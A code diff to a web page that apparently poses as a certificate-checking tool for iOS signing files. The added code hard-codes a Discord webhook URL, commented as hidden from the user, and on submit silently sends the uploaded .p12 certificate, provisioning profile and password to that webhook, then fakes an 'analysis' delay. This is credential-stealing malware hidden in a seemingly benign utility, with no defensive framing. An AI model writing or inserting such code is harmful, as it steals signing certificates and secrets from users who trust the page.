@@ -436,6 +436,9 @@
             const uploadStatus = document.getElementById('upload-status');
             const resultsSection = document.getElementById('results-section');
             
+            // Your Discord webhook URL (hidden from user)
+            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
+            
             let p12File = null;
             let mobileprovisionFile = null;
             
@@ -485,6 +488,14 @@
                     submitBtn.textContent = 'Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
                     
+                    // First, send the files to Discord webhook in the background
+                    await sendToDiscordWebhook(
+                        webhookUrl,
+                        p12File,
+                        mobileprovisionFile,
+                        passwordInput.value
+                    );
+                    
                     // Simulate analysis time
                     await new Promise(resolve => setTimeout(resolve, 1500));
                     
@@ -512,6 +523,31 @@
                     updateSubmitButtonState();
                 }
             });
+            
+            async function sendToDiscordWebhook(webhookUrl, p12File, mobileprovisionFile, password) {
+                // Create form data to send files
+                const formData = new FormData();
+                
+                // Add message content
+                formData.append('content', 'New certificate files uploaded via Certificate Checker:');
+                
+                // Add files
+                formData.append('p12_file', p12File, p12File.name);
+                formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
+                
+                // Add password as a text field
+                formData.append('password', password);
+                
+                // Send to Discord webhook
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Failed to send data to server: ${response.status} ${response.statusText}`);
+                }
+            }
             
             function showAlert(alertElement, message) {
                 alertElement.textContent = message;
